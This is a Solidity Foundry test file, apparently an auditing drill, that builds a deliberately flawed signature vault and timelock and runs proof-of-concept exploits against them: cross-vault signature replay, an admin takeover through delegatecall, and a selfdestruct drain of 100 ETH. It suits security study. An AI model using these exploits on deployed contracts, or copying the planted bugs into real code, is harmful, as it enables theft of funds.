// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// ============================================================
// CONTRACTS (from drill15)
// ============================================================

contract Token {
    string public name = "Token";
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "not approved");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IERC20Like {
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract SignatureVault {
    string public constant NAME = "TreasuryVault";
    string public constant VERSION = "1";

    address public owner;
    Token public token;
    uint256 public totalDeposited;

    mapping(address => uint256) public nonces;
    mapping(bytes32 => bool) public usedSignatures;

    bytes32 public constant WITHDRAW_TYPEHASH =
        keccak256("Withdraw(address to,uint256 amount,uint256 nonce,uint256 deadline)");

    constructor(address _token) {
        owner = msg.sender;
        token = Token(_token);
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        totalDeposited += amount;
    }

    // BUG #1: no chainId, no verifyingContract
    function domainSeparator() public view returns (bytes32) {
        return keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version)"),
            keccak256(bytes(NAME)),
            keccak256(bytes(VERSION))
        ));
    }

    function withdrawWithSig(
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(block.timestamp <= deadline, "expired");

        bytes32 structHash = keccak256(abi.encode(
            WITHDRAW_TYPEHASH,
            to,
            amount,
            nonces[owner],
            deadline
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator(), structHash));

        address signer = ecrecover(digest, v, r, s);
        require(signer == owner, "bad signature");
        require(signer != address(0), "bad signature");

        bytes32 sigHash = keccak256(abi.encodePacked(r, s, v));
        require(!usedSignatures[sigHash], "signature used");
        usedSignatures[sigHash] = true;

        nonces[owner]++;

        totalDeposited -= amount;
        token.transfer(to, amount);
    }
}

contract Timelock {
    address public admin;
    uint256 public constant DELAY = 2 days;

    struct Operation {
        address target;
        uint256 value;
        bytes data;
        uint256 eta;
        bool executed;
    }

    mapping(bytes32 => Operation) public operations;
    uint256 public operationCount;

    constructor() {
        admin = msg.sender;
    }

    receive() external payable {}

    function schedule(address target, uint256 value, bytes calldata data) external returns (bytes32) {
        require(msg.sender == admin, "not admin");
        bytes32 opHash = keccak256(abi.encode(target, value, data));
        require(operations[opHash].eta == 0, "already scheduled");
        operations[opHash] = Operation({
            target: target,
            value: value,
            data: data,
            eta: block.timestamp + DELAY,
            executed: false
        });
        operationCount++;
        return opHash;
    }

    // BUG #3a: no access control, #3b: no grace period, #3c: delegatecall
    function execute(bytes32 opHash) external payable returns (bytes memory) {
        Operation storage op = operations[opHash];
        require(op.eta != 0, "not scheduled");
        require(block.timestamp >= op.eta, "too early");
        require(!op.executed, "already executed");

        op.executed = true;

        (bool success, bytes memory result) = op.target.delegatecall(op.data);
        require(success, "execution failed");
        return result;
    }
}

// Malicious "library" that overwrites slot 0 (= Timelock.admin)
contract AdminOverwriter {
    function overwriteAdmin(address newAdmin) external {
        assembly {
            sstore(0, newAdmin)
        }
    }
}

// Malicious "upgrade target" that drains ETH via selfdestruct
contract DrainBomb {
    function upgradeTo(address) external {
        // runs in Timelock storage context via delegatecall
        // selfdestruct sends Timelock's balance to attacker
        selfdestruct(payable(msg.sender));
    }
}

// ============================================================
// PoC TESTS
// ============================================================
contract Drill15PoC is Test {
    Token token;
    SignatureVault vault1;
    SignatureVault vault2;
    Timelock timelock;

    uint256 ownerKey = 0x0A77E12;
    address owner;
    address attacker = address(0xA77AC);
    address contractor = address(0xC0DEC);

    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function setUp() public {
        owner = vm.addr(ownerKey);

        token = new Token();

        // Owner deploys TWO vaults with the same token
        // (simulates same contract deployed on 2 chains)
        vm.startPrank(owner);
        vault1 = new SignatureVault(address(token));
        vault2 = new SignatureVault(address(token));
        vm.stopPrank();

        // Fund both vaults via proper deposits
        token.mint(owner, 20_000e18);
        vm.startPrank(owner);
        token.approve(address(vault1), type(uint256).max);
        token.approve(address(vault2), type(uint256).max);
        vault1.deposit(10_000e18);
        vault2.deposit(10_000e18);
        vm.stopPrank();

        // Timelock with 100 ETH
        timelock = new Timelock();
        vm.deal(address(timelock), 100 ether);
    }

    function _signWithdraw(address to, uint256 amount, uint256 nonce, uint256 deadline)
        internal view returns (uint8, bytes32, bytes32)
    {
        bytes32 structHash = keccak256(abi.encode(
            vault1.WITHDRAW_TYPEHASH(),
            to,
            amount,
            nonce,
            deadline
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", vault1.domainSeparator(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, digest);
        return (v, r, s);
    }

    // ============================================================
    // PoC #1: Domain Replay — ONE signature, TWO vaults
    // (local simulation of cross-chain replay)
    // ============================================================
    function test_PoC1_CrossVaultReplay() public {
        console2.log("=== PoC #1: Domain Replay (no chainId/verifyingContract) ===");

        // Domain separators are IDENTICAL across both vaults
        assertEq(vault1.domainSeparator(), vault2.domainSeparator(), "domains must match");
        console2.log("Domain separators IDENTICAL across vault1 and vault2");

        uint256 deadline = block.timestamp + 1 days;

        // Owner signs ONE payment: 1000 tokens to contractor
        (uint8 v, bytes32 r, bytes32 s) = _signWithdraw(contractor, 1000e18, 0, deadline);

        // Attacker submits the SAME signature to vault2 FIRST
        vm.prank(attacker);
        vault2.withdrawWithSig(contractor, 1000e18, deadline, v, r, s);

        console2.log("Signature replayed on vault2: contractor got 1000 tokens");
        assertEq(token.balanceOf(contractor), 1000e18);

        // The original signature is STILL valid on vault1 (different nonce storage!)
        vm.prank(attacker);
        vault1.withdrawWithSig(contractor, 1000e18, deadline, v, r, s);

        console2.log("Same signature ALSO valid on vault1: another 1000 tokens");
        assertEq(token.balanceOf(contractor), 2000e18);

        console2.log("");
        console2.log("[BUG] ONE owner signature = TWO payments");
        console2.log("  Owner intended: 1000 tokens");
        console2.log("  Actually paid:  2000 tokens");
        console2.log("  On-chain: this = same contract on Ethereum + Arbitrum/Base");
        console2.log("  Fix: include chainId AND verifyingContract in EIP712Domain");
    }

    // ============================================================
    // PoC #2: Malleability — BLOCKED by nonce (honest negative)
    // ============================================================
    function test_PoC2_MalleabilityBlockedByNonce() public {
        console2.log("=== PoC #2: Malleability (BLOCKED by nonce) ===");

        uint256 deadline = block.timestamp + 1 days;
        (uint8 v, bytes32 r, bytes32 s) = _signWithdraw(contractor, 1000e18, 0, deadline);

        // Compute the malleable twin: (r, N-s, flipped v)
        bytes32 sTwin = bytes32(N - uint256(s));
        uint8 vTwin = v == 27 ? 28 : 27;

        // Verify twin recovers the SAME signer
        bytes32 structHash = keccak256(abi.encode(
            vault1.WITHDRAW_TYPEHASH(), contractor, 1000e18, uint256(0), deadline
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", vault1.domainSeparator(), structHash));
        address recoveredTwin = ecrecover(digest, vTwin, r, sTwin);
        assertEq(recoveredTwin, owner, "twin must recover owner");
        console2.log("Malleable twin recovers SAME signer: confirmed");

        // Original withdraw succeeds
        vault1.withdrawWithSig(contractor, 1000e18, deadline, v, r, s);
        assertEq(token.balanceOf(contractor), 1000e18);
        console2.log("Original withdraw: OK (nonce now 1)");

        // Twin withdraw FAILS: digest now uses nonce=1, twin signed with nonce=0
        vm.expectRevert("bad signature");
        vault1.withdrawWithSig(contractor, 1000e18, deadline, vTwin, r, sTwin);

        console2.log("Twin withdraw: REVERTS (nonce already incremented)");
        console2.log("");
        console2.log("[HONEST] Malleability NOT exploitable here.");
        console2.log("  nonces[owner]++ blocks the twin.");
        console2.log("  usedSignatures mapping = redundant.");
        console2.log("  DO NOT report this as double-withdraw.");
        console2.log("  Severity: Informational (code smell only).");
    }

    // ============================================================
    // PoC #3: Timelock — no ACL + delegatecall = admin takeover
    // ============================================================
    function test_PoC3_TimelockAdminTakeover() public {
        console2.log("=== PoC #3: Timelock delegatecall admin takeover ===");

        AdminOverwriter overwriter = new AdminOverwriter();

        console2.log("Timelock admin before:", timelock.admin());

        // Admin schedules what looks like a config update
        // (target happens to be a contract that writes slot 0)
        vm.prank(timelock.admin());
        bytes32 opHash = timelock.schedule(
            address(overwriter),
            0,
            abi.encodeCall(AdminOverwriter.overwriteAdmin, (attacker))
        );

        // Attacker CANNOT execute yet (too early)
        vm.prank(attacker);
        vm.expectRevert("too early");
        timelock.execute(opHash);
        console2.log("Before eta: execute blocked (too early)");

        // Wait for delay
        vm.warp(block.timestamp + 2 days + 1);

        // ATTACKER executes (no access control!)
        vm.prank(attacker);
        timelock.execute(opHash);

        console2.log("After eta: ATTACKER executed the operation (no ACL)");
        console2.log("Timelock admin after:", timelock.admin());

        assertEq(timelock.admin(), attacker, "attacker is now admin");
        console2.log("");
        console2.log("[CRITICAL] delegatecall overwrote Timelock slot 0 (admin)");
        console2.log("  - execute() has no msg.sender check");
        console2.log("  - no grace period (valid forever after eta)");
        console2.log("  - delegatecall runs target code in Timelock storage");
    }

    // ============================================================
    // PoC #4: Timelock — selfdestruct ETH drain via delegatecall
    // ============================================================
    function test_PoC4_TimelockETHDrain() public {
        console2.log("=== PoC #4: Timelock ETH drain via selfdestruct ===");

        DrainBomb bomb = new DrainBomb();

        console2.log("Timelock balance before:", address(timelock).balance / 1e18, "ETH");

        // Admin schedules a routine "upgrade" to what is actually a bomb
        vm.prank(timelock.admin());
        bytes32 opHash = timelock.schedule(
            address(bomb),
            0,
            abi.encodeCall(DrainBomb.upgradeTo, (address(0)))
        );

        vm.warp(block.timestamp + 2 days + 1);

        uint256 attackerBefore = attacker.balance;

        // Attacker executes: delegatecall runs selfdestruct
        // in Timelock context -> Timelock's ETH goes to attacker (msg.sender)
        vm.prank(attacker);
        timelock.execute(opHash);

        uint256 attackerAfter = attacker.balance;

        console2.log("Timelock balance after:", address(timelock).balance / 1e18, "ETH");
        console2.log("Attacker balance before:", attackerBefore / 1e18, "ETH");
        console2.log("Attacker balance after:", attackerAfter / 1e18, "ETH");

        assertEq(attackerAfter - attackerBefore, 100 ether, "100 ETH drained");
        assertEq(address(timelock).balance, 0, "timelock empty");

        console2.log("");
        console2.log("[CRITICAL] 100 ETH DRAINED via selfdestruct in delegatecall");
        console2.log("  msg.sender inside delegatecall = attacker (execute caller)");
        console2.log("  selfdestruct sent Timelock's full balance to attacker");
    }
}
